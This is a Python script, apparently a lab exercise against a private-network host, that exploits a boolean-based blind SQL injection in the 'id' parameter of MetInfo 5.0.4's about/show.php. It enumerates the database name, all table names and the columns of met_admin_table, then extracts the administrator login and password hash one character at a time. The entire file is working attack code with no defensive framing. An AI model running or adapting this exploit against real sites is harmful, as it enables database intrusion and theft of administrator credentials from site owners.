import requests
import string
url="http://192.168.200.148/MetInfo5.0.4/about/show.php"

req=requests.session()


# 确定数据库名的长度
for i in range(1,51):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select database()))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        dbname_len=i
        break
print(f"[+] The length of dbname is {i}")

# 确定数据库名
c_set=string.printable.strip()
db_name=""
for i in range(1,dbname_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select database()),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            db_name+=j
            break
print(f"[+] name of The Database is {db_name}")


# 确定所有表名的长度
for i in range(1,501):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        tablename_len=i
        break
print(f"[+] The length of tables name is {i}")


# 确定所有表的表名
c_set=string.printable.strip()
table_name=""
for i in range(1,tablename_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            print(f"\r[-] name of tables is :{table_name}",end="")
            table_name+=j
            break
print(f"\n\n[+] name of tables is :{table_name}")

# 确定所有表名的长度
for i in range(1,501):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        columnname_len=i
        break
print(f"[+] The length of columns name is {i}")


# 确定所有表的表名
c_set=string.printable.strip()
column_name=""
for i in range(1,columnname_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            print(f"\r[-] name of columns is :{column_name}",end="")
            column_name+=j
            break
print(f"\n\n[+] name of column is :{column_name}")

# 查询账密
for i in range(1,501):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select concat(admin_id,0x3a,admin_pass) from met_admin_table))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        admin_len=i
        break
print(f"[+] The length of admin is {i}")


# 确定账密
c_set=string.printable.strip()
admin_name_pass=""
for i in range(1,admin_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select concat(admin_id,0x3a,admin_pass) from met_admin_table),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            print(f"\r[-]  admin_name_pass is :{admin_name_pass}",end="")
            admin_name_pass+=j
            break
print(f"\n\n[+]  admin_name_pass is :{admin_name_pass}")

